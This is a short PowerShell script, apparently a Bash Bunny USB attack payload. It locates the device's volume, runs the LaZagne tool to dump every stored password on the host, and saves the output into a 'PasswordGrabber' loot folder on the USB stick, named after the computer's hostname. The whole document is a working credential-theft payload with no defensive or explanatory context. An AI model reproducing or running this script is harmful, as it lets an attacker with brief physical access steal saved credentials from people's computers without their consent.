$bunny = ((Get-WmiObject win32_volume -f 'label=''BashBunny''').Name ) 
$file = hostname
cd $bunny'payloads'

.\lazagne.exe all > $bunny'loot\PasswordGrabber\'$file'.txt'


